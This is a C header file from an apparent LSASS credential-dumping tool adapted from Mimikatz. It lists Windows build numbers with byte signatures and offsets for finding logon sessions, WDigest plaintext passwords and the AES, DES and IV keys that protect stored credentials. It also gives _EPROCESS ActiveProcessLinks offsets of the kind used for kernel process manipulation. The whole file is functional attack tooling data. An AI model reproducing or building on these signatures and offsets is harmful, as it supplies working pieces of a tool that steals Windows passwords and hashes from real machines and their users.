#pragma once

//
////
//// Used when comparing version numbers
//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/inc/globals.h#L104
////
//

#define KULL_M_WIN_BUILD_XP		2600
#define KULL_M_WIN_BUILD_2K3	3790
#define KULL_M_WIN_BUILD_VISTA	6000
#define KULL_M_WIN_BUILD_7		7600
#define KULL_M_WIN_BUILD_8		9200 // (Windows 8 / Server 2012)
#define KULL_M_WIN_BUILD_BLUE	9600 // (Windows 8.1 / Server 2012 R2)
#define KULL_M_WIN_BUILD_10_1507	10240
#define KULL_M_WIN_BUILD_10_1511	10586
#define KULL_M_WIN_BUILD_10_1607	14393
#define KULL_M_WIN_BUILD_10_1703	15063
#define KULL_M_WIN_BUILD_10_1709	16299
#define KULL_M_WIN_BUILD_10_1803	17134
#define KULL_M_WIN_BUILD_10_1809	17763
#define KULL_M_WIN_BUILD_10_1903	18362
#define KULL_M_WIN_BUILD_10_1909	18363
#define KULL_M_WIN_BUILD_10_2004	19041
#define KULL_M_WIN_BUILD_10_20H2	19042
#define KULL_M_WIN_BUILD_10_21H2	19044
#define KULL_M_WIN_BUILD_2022		20348
#define KULL_M_WIN_BUILD_11_22H2	22621
#define KULL_M_WIN_BUILD_11_24H2    26100




//
////
//// Below is the WDigest structure and byte signature
//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c#L14C6-L14C25
////
//

 unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 }; // PTRN_WIN6_PasswdSet from Mimikatz
/*  
    Singular WDigest List Entry (partially from _KIWI_WDIGEST_LIST_ENTRY)

    struct _KIWI_WDIGEST_LIST_ENTRY *Flink; // 0
    struct _KIWI_WDIGEST_LIST_ENTRY *Blink; // 0x8
    ULONG	UsageCount;                     // 0x10
    struct _KIWI_WDIGEST_LIST_ENTRY *This;  // 0x18
    LUID LocallyUniqueIdentifier;           // 0x20
    ?? unknown                              // 0x28 
    UNICODE_STRING Username                 // 0x30
    UNICODE_STRING Domain                   // 0x40
    UNICODE_STRING Password                 // 0x50
*/




//
////
//// Below is used for getting the offsets to the credential keys
//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
////
//

typedef struct {
    DWORD WindowsVersion;
    unsigned char* credentialKeySig;
    int KeySigSize;
    int AES_OFFSET;
    int DES_OFFSET;
    int IV_OFFSET;
} LsassCredentialKeyOffsets;

BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]	= {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};

// Version, Credential Key Signature, Key Signature Size, AES, DES, IV - (Mimikatz has it formatted as: IV, DES, AES)
LsassCredentialKeyOffsets LsassKeyOffsetsArray[] = { 
    {KULL_M_WIN_BUILD_VISTA,   PTRN_WNO8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY), 25, -69, 63},
	{KULL_M_WIN_BUILD_7,	   PTRN_WNO8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY), 25, -61, 59},
	{KULL_M_WIN_BUILD_8,	   PTRN_WIN8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY), 23, -70, 62},
	{KULL_M_WIN_BUILD_10_1507, PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -73, 61},
	{KULL_M_WIN_BUILD_10_1809, PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -89, 67},
	{KULL_M_WIN_BUILD_11_22H2, PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY), 16, -89, 71},
};




//
////
//// Below is used for getting the ActiveProcessLinks member offset in the _EPROCESS structure
//// Obtained from Vergilius Project - https://www.vergiliusproject.com/
////
//

typedef struct {
    DWORD WindowsVersion;
    int ActiveProcessLinksOffset;
} EPROCESSOffsets;

EPROCESSOffsets EPROCESSOffsetsArray[] = {
{KULL_M_WIN_BUILD_8, 0x2e8},       // 9600 (Windows 8.1 / Server 2012 R2) to 9200 (Windows 8 / Server 2012)
{KULL_M_WIN_BUILD_10_1507, 0x2f0}, // (1607) 14393 to (1507) 10240
{KULL_M_WIN_BUILD_10_1703, 0x2e8}, // (1809) 17763 to (1703) 15063
{KULL_M_WIN_BUILD_10_1903, 0x2f0}, // (1909) 18363 to (1903) 18362
{KULL_M_WIN_BUILD_10_2004, 0x448}, // (22h2) 19045 to (2004) 19041
{KULL_M_WIN_BUILD_11_24H2, 0x1d8}
};




//
////
//// Below is used for getting LogonSessionList
//// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c#L15
////
//

typedef struct {
    DWORD WindowsVersion;
    unsigned char* LogonSessionListSig;
    int SigSize;
    int LogonSessionList_OFFSET;
} LsassLogonSessionListOffsets;

BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN11_22H2_LogonSessionList[]	= {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};

LsassLogonSessionListOffsets LsassLogonSessionListArray[] = {
{KULL_M_WIN_BUILD_XP,        PTRN_WIN5_LogonSessionList,        sizeof(PTRN_WIN5_LogonSessionList),        -4},
{KULL_M_WIN_BUILD_2K3,       PTRN_WIN5_LogonSessionList,        sizeof(PTRN_WIN5_LogonSessionList),        -4},
{KULL_M_WIN_BUILD_VISTA,     PTRN_WN60_LogonSessionList,        sizeof(PTRN_WN60_LogonSessionList),        21},
{KULL_M_WIN_BUILD_7,         PTRN_WN61_LogonSessionList,        sizeof(PTRN_WN61_LogonSessionList),        19},
{KULL_M_WIN_BUILD_8,         PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        16},
{KULL_M_WIN_BUILD_BLUE,      PTRN_WN63_LogonSessionList,        sizeof(PTRN_WN63_LogonSessionList),        36},
{KULL_M_WIN_BUILD_10_1507,   PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        16},
{KULL_M_WIN_BUILD_10_1703,   PTRN_WN1703_LogonSessionList,      sizeof(PTRN_WN1703_LogonSessionList),      23},
{KULL_M_WIN_BUILD_10_1803,   PTRN_WN1803_LogonSessionList,      sizeof(PTRN_WN1803_LogonSessionList),      23},
{KULL_M_WIN_BUILD_10_1903,   PTRN_WN6x_LogonSessionList,        sizeof(PTRN_WN6x_LogonSessionList),        23},
{KULL_M_WIN_BUILD_2022,      PTRN_WN11_LogonSessionList,        sizeof(PTRN_WN11_LogonSessionList),        24},
{KULL_M_WIN_BUILD_11_22H2,   PTRN_WN11_22H2_LogonSessionList,   sizeof(PTRN_WN11_22H2_LogonSessionList),   27},
};